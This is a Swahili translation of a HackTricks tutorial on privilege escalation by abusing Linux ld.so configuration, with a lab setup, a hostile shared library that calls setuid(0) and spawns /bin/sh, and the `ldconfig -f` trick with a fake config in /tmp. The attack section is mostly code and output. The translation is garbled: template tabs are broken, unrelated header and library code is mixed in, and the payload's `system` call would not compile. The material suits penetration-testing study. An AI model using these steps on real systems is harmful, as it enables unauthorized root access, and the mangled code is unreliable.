# Mfano wa shambulio la kufikia mamlaka ya juu ya ld.so

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi mtaalam wa juu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Andaa mazingira

Katika sehemu ifuatayo unaweza kupata nambari ya faili ambazo tutatumia kuandaa mazingira

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% tab title="libcustom.h" %}

```c
#ifndef LIBCUSTOM_H
#define LIBCUSTOM_H

void custom_function();

#endif
```

Faili hili linadefine kichwa cha ulinzi `LIBCUSTOM_H` na ina kazi moja inayoitwa `custom_function()`.
```c
#include <stdio.h>

void vuln_func();
```
{% tab title="libcustom.c" %}

```c
#include <stdio.h>

void custom_function() {
    printf("This is a custom function\n");
}
```

{% endtab %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% tabs %}
{% tab title="Swahili" %}
1. **Tengeneza** faili hizo kwenye kompyuta yako katika folda ile ile
2. **Kamilisha** **maktaba**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Nakili** `libcustom.so` kwenda `/usr/lib`: `sudo cp libcustom.so /usr/lib` (mamlaka ya msingi)
4. **Kamilisha** **programu inayoweza kushiriki**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Angalia mazingira

Angalia kwamba _libcustom.so_ ina **pakuliwa** kutoka _/usr/lib_ na kwamba unaweza **kutekeleza** faili ya binari.
{% endtab %}
{% endtabs %}
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Kudukiza

Katika kisa hiki tutafikiria kwamba **mtu fulani ameunda kiingilio kinachoweza kudukizwa** ndani ya faili katika _/etc/ld.so.conf/_:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
Kabati lenye udhaifu ni _/home/ubuntu/lib_ (ambapo tuna ufikiaji wa kuandika).\
**Pakua na kisindike** nambari ifuatayo ndani ya njia hiyo:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Sasa tukiwa tumetengeneza maktaba ya hatari ya libcustom ndani ya njia iliyopangwa vibaya, tunahitaji kusubiri kwa ajili ya kuanza upya au kwa mtumiaji wa mizizi kutekeleza `ldconfig` (katika kesi unaweza kutekeleza faili hii kama sudo au ina bit suid unaweza kuitekeleza mwenyewe).

Baada ya hili kutokea, angalia tena mahali ambapo kutekelezwa kwa `sharevuln` inapakia maktaba ya `libcustom.so` kutoka:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Kama unavyoona ina **inapakia kutoka `/home/ubuntu/lib`** na ikiwa mtumiaji yeyote anatekeleza, kifaa cha kutekeleza kitatekelezwa:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
Tafadhali kumbuka kuwa katika mfano huu hatujapandisha vyeo, lakini kwa kubadilisha amri zilizotekelezwa na **kungoja mtumiaji wa mizizi au mtumiaji mwingine mwenye mamlaka kutekeleza faili inayoweza kudhurika** tutaweza kupandisha vyeo.
{% endhint %}

### Ulandanishi mwingine - Kosa sawa

Katika mfano uliopita tulifanya udanganyifu wa kosa ambapo msimamizi **aliamsha folda isiyokuwa na mamlaka ndani ya faili ya usanidi ndani ya `/etc/ld.so.conf.d/`**.\
Lakini kuna ulandanishi mwingine ambao unaweza kusababisha udhaifu sawa, ikiwa una **ruhusa ya kuandika** katika **faili ya usanidi** ndani ya `/etc/ld.so.conf.d`, katika folda `/etc/ld.so.conf.d` au katika faili `/etc/ld.so.conf` unaweza kuweka udhaifu sawa na kuitumia.

## Kudukua 2

**Fikiria una ruhusa za sudo juu ya `ldconfig`**.\
Unaweza kuonyesha `ldconfig` **mahali pa kupakia faili za usanidi kutoka**, kwa hivyo tunaweza kutumia hilo kufanya `ldconfig` ipakie folda za kiholela.\
Basi, hebu tujenge faili na folda zinazohitajika kupakia "/tmp":
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Sasa, kama ilivyoelezwa katika **shambulio lililopita**, **unda maktaba ya hatari ndani ya `/tmp`**. 
Na mwishowe, tulete njia na tuchunguze wapi programu inapakia maktaba kutoka:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Kama unavyoona, ukiwa na mamlaka ya sudo juu ya `ldconfig` unaweza kutumia udhaifu huo huo.**

{% hint style="info" %}
**Sikupata** njia ya kuutumia udhaifu huu ikiwa `ldconfig` imeundwa na **biti ya suid**. Kosa lifuatalo linaonekana: `/sbin/ldconfig.real: Haiwezi kuunda faili ya cache ya muda /etc/ld.so.cache~: Ruhusa imekataliwa`
{% endhint %}

## Marejeo

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* Dab machine in HTB

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
